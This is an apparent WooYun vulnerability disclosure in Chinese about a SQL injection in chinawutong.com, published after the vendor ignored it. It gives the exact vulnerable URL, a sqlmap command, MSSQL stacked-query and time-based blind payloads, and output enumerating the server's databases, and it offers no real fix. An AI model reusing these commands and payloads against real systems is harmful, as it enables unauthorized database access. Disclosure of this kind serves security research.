wybug_status: 未联系到厂商或者厂商积极忽略
wybug_detail: 漏洞详情 披露状态：   									2014-07-14：	积极联系厂商并且等待厂商认领中，细节不对外公开									2014-08-28：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： 为了给用户提供更优质的服务，更方便用户使用网站，特创建“挑错有礼”栏目。  挑错有礼 挑注入有吗 ？？？？？？？？？？？？？？？？？？？？ 详细说明：  sqlmap.py -u "http://www.chinawutong.com/ashx/rediecturl.ashx?listwlline=1" --dbsPlace: GETParameter: listwlline    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: listwlline=1'; WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: listwlline=1' WAITFOR DELAY '0:0:5'-----[18:01:38] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2008 R2 or 7web application technology: ASP.NET, Microsoft IIS 7.5, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2008[18:01:38] [INFO] fetching database names[18:01:38] [INFO] fetching number of databases[18:01:38] [WARNING] time-based comparison requires larger statistical model, please wait..............................do you want sqlmap to try to optimize value(s) for DBMS delay responses (option'--time-sec')? [Y/n] y[18:01:48] [WARNING] it is very important not to stress the network adapter during usage of time-based payloads to prevent potential errors[18:01:59] [INFO] adjusting time delay to 1 second due to good response times8[18:01:59] [INFO] retrieved: distribution[18:03:00] [INFO] retrieved: master[18:03:29] [INFO] retrieved: model[18:03:55] [INFO] retrieved: msdb[18:04:15] [INFO] retrieved: ReportServer[18:05:15] [INFO] retrieved: ReportServerTempDB[18:06:42] [INFO] retrieved: tempdb[18:07:13] [INFO] retrieved: WutongA   漏洞证明：  available databases [8]:[*] distribution[*] master[*] model[*] msdb[*] ReportServer[*] ReportServerTempDB[*] tempdb[*] WutongA   修复方案：   挑错有礼 挑注入有吗 ？？？？？？？？？？？？？？？？？？？？   版权声明：转载请注明来源 Lonely@乌云
